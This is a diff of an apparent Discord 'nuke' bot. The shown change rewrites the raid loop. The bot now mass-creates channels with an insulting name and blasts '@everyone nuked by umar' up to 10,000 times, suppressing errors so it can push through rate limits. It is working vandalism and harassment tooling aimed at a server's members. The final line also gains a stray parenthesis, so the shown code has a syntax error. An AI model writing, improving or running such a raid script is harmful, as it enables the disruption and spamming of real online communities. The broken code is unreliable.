@@ -49,28 +49,31 @@ async def nuke(ctx):
             except:
                 pass
     
-    # STEP 4: CREATE 100 CHANNELS (FAST)
-    channels = []
-    for i in range(100):
-        try:
-            channel = await guild.create_text_channel(f"get shitted on by umar")
-            channels.append(channel)
-        except:
-            pass
-    
-    # STEP 5: PING @EVERYONE IN EVERY CHANNEL AS FAST AS POSSIBLE
+    # STEP 4: CREATE CHANNELS AND PING INSTANTLY
     ping_target = 10000
     ping_count = 0
     
     while ping_count < ping_target:
-        for channel in channels:
+        # Create a channel
+        try:
+            channel = await guild.create_text_channel(f"get shitted on by umar")
+        except:
+            continue
+        
+        # Ping in this channel immediately
+        try:
+            await channel.send(f"@everyone nuked by umar")
+            ping_count += 1
+        except:
+            pass
+        
+        # Keep pinging in this channel as fast as possible
+        while ping_count < ping_target:
             try:
                 await channel.send(f"@everyone nuked by umar")
                 ping_count += 1
-                if ping_count >= ping_target:
-                    break
             except:
-                pass
+                break  # If rate limited, move to next channel
 
 # ===== RUN BOT =====
-bot.run(TOKEN)
+bot.run(TOKEN))
